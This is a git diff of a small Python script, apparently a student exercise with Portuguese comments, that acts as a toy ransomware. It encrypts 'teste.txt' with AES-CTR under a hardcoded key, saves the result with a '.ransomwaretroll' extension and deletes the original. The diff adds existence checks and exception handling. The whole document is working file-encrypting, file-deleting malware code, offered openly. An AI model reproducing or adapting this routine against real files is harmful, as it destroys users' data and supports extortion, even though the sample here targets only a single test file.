@@ -1,24 +1,41 @@
 import os
 import pyaes
-
-## abrir o arquivo a ser criptografado
+import sys
+##arquivo que será criptografado
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
-
-## chave de criptografia
+##Key para descriptografia
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+## --- LÓGICa
+try:
+    # 1. Verificar se o arquivo existe
+    if not os.path.exists(file_name):
+        print(f"ERRO: O arquivo '{file_name}' não foi encontrado.")
+        sys.exit(1) # Encerra o script
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    # 2. Ler os dados do arquivo original
+    with open(file_name, "rb") as file:
+        file_data = file.read()
+
+    # 3. Criptografar os dados em memória
+    print(f"Criptografando o arquivo: {file_name}")
+    aes = pyaes.AESModeOfOperationCTR(key)
+    crypto_data = aes.encrypt(file_data)
+
+    # 4. Criar o novo arquivo criptografado com a extensão do ransomware
+    new_file_name = file_name + ".ransomwaretroll"
+    with open(new_file_name, "wb") as new_file:
+        new_file.write(crypto_data)
+      
+    #apos verificação arquvio antigo é removido
+    os.remove(file_name)
+
+    print(f"\nSUCESSO! O arquivo '{file_name}' foi criptografado para '{new_file_name}'.")
+    print("O arquivo original foi removido.")
+
+
+except Exception as e:
+    # captura exceção de erro e mostra
+    print(f"\nOCORREU UM ERRO INESPERADO: {e}")
+
